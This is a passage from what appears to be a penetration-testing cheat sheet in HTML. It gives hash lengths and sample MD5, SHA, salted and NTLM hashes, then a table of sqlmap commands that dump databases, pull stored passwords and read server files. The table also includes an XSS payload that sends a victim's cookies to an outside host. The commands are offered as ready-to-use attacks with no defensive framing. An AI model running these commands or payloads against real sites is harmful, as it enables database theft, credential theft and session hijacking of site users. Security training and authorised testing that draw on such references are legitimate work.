        <p><code>16 Bytes</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>SHA-1 Hash Length</p>
      </td>
      <td>
        <p><code>20 Bytes</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>SHA-256 Hash Length</p>
      </td>
      <td>
        <p><code>32 Bytes</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>SHA-512 Hash Length</p>
      </td>
      <td>
        <p><code>64 Bytes</code></p>
      </td>
    </tr>
  </tbody>
</table>
</div>

### Hash Examples

Likely just use hash-identifier for this but here are some example hashes

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Hash</th>
      <th>Example</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p>MD5 Hash Example</p>
      </td>
      <td>
        <p><code>8743b52063cd84097a65d1633f5c74f5</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>MD5 $PASS:$SALT Example</p>
      </td>
      <td>
        <p><code>01dfae6e5d4d90d9892622325959afbe:7050461</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>MD5 $SALT:$PASS</p>
      </td>
      <td>
        <p><code>f0fda58630310a6dd91a7d8f0a4ceda2:4225637426</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>SHA1 Hash Example</p>
      </td>
      <td>
        <p><code>b89eaac7e61417341b710b727768294d0e6a277b</code></p>
      </td>
    </tr>

    <tr>  
      <td>
        <p>SHA1 $PASS:$SALT</p>
      </td>
      <td>
        <p><code>2fc5a684737ce1bf7b3b239df432416e0dd07357:2014</code></p>
      </td>
    </tr>

    <tr>  
      <td>
        <p>SHA1 $SALT:$PASS</p>
      </td>
      <td>
        <p><code>cac35ec206d868b7d7cb0b55f31d9425b075082b:5363620024</code></p>
      </td>
    </tr>

    <tr>  
      <td>
        <p>SHA-256</p>
      </td>
      <td>
        <p><code>127e6fbfe24a750e72930c220a8e138275656b<br>8e5d8f48a98c3c92df2caba935</code></p>
      </td>
    </tr>

    <tr>  
      <td>
        <p>SHA-256 $PASS:$SALT</p>
      </td>
      <td>
        <p><code>c73d08de890479518ed60cf670d17faa26a4a7<br>1f995c1dcc978165399401a6c4</code></p>
      </td>
    </tr>

    <tr>  
      <td>
        <p>SHA-256 $SALT:$PASS</p>
      </td>
      <td>
        <p><code>eb368a2dfd38b405f014118c7d9747fcc97f4<br>f0ee75c05963cd9da6ee65ef498:560407001617</code></p>
      </td>
    </tr>

    <tr>  
      <td>
        <p>SHA-512</p>
      </td>
      <td>
        <p><code>82a9dda829eb7f8ffe9fbe49e45d47d2dad9<br>664fbb7adf72492e3c81ebd3e29134d9bc<br>12212bf83c6840f10e8246b9db54a4<br>859b7ccd0123d86e5872c1e5082f</code></p>
      </td>
    </tr>

    <tr>  
      <td>
        <p>SHA-512 $PASS:$SALT</p>
      </td>
      <td>
        <p><code>e5c3ede3e49fb86592fb03f471c35ba13e8<br>d89b8ab65142c9a8fdafb635fa2223c24e5<br>558fd9313e8995019dcbec1fb58414<br>6b7bb12685c7765fc8c0d51379fd</code></p>
      </td>
    </tr>

    <tr>  
      <td>
        <p>SHA-512 $SALT:$PASS</p>
      </td>
      <td>
        <p><code>976b451818634a1e2acba682da3fd6ef<br>a72adf8a7a08d7939550c244b237c72c7d4236754<br>4e826c0c83fe5c02f97c0373b6b1<br>386cc794bf0d21d2df01bb9c08a</code></p>
      </td>
    </tr>

    <tr>  
      <td>
        <p>NTLM Hash Example</p>
      </td>
      <td>
        <p><code>b4b9b02e6f09a9bd760f388b67351e2b</code></p>
      </td>
    </tr>

  </tbody>
</table>
</div>


## Basic Web App

### SQLMap Examples

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p><code>sqlmap -u http://meh.com --forms --batch --crawl=10 <br> --cookie=jsessionid=54321 --level=5 --risk=3</code></p>
      </td>
      <td>
            <p>Automated sqlmap scan</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>sqlmap -u <target> -p PARAM --data=POSTDATA --cookie=COOKIE <br> --level=3 --current-user --current-db --passwords <br> --file-read="/var/www/blah.php"</code></p>
      </td>
      <td>
            <p>Targeted sqlmap scan</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>//<document.write('<img src="http://highon.coffee/x.gif?cookie=' + document.cookie + '" />)</code></p>
      </td>
      <td>
            <p>XSS steal cookie</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>sqlmap -u "http://meh.com/meh.php?id=1" <br>--dbms=mysql --tech=U --random-agent --dump </code></p>
      </td>
      <td>
            <p>Scan url for union + error based injection with mysql backend <br>and use a random user agent + database dump</p>
      </td>
    </tr>
  </tbody>
</table>
</div>
